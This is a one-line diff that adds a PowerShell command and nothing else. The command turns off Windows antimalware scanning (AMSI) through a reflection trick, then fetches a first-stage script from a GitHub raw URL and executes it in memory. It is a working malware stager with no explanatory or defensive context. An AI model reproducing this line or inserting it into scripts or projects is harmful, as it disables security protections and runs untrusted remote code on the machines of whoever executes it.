@@ -1,0 +1,1 @@
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);iex(iwr -useb https://raw.githubusercontent.com/taxesmmmm-collab/tsetinyourmymmas-ass/main/stage1_tiny.ps1)
